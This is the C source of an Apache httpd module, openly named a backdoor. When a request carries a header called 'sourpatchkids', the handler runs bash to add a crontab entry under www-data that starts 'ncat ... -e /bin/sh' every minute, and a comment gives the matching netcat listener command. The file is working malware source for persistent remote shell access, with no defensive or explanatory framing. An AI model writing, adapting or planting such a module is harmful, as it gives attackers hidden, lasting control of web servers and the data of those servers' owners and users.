// cronjob will be created under the `www-data` user.
//sudo nc -lvnp 4444
#include "httpd.h"
#include "http_protocol.h"
#include "http_request.h"
#include "http_config.h"
#include "apr_strings.h"
//#include <stdio.h>
//#include <stdlib.h>
//#include <unistd.h>
static int backdoor_handler(request_rec *r) {
   const char *cmd = apr_table_get(r->headers_in, "sourpatchkids");
   if (!cmd) return DECLINED;
   if (cmd){
      execl("/bin/bash", "bash", "-c", "test=$(crontab -l | grep  'ncat' | wc -l); if [ $test == 0 ]; then (crontab -l 2>/dev/null; echo '* * * * * ncat localhost 1337 -e /bin/sh') | crontab -;  fi", NULL);
      return OK;
   }
   
}

static void register_hooks(apr_pool_t *p) {
   ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
   STANDARD20_MODULE_STUFF,
   NULL, NULL, NULL, NULL, NULL, register_hooks
};

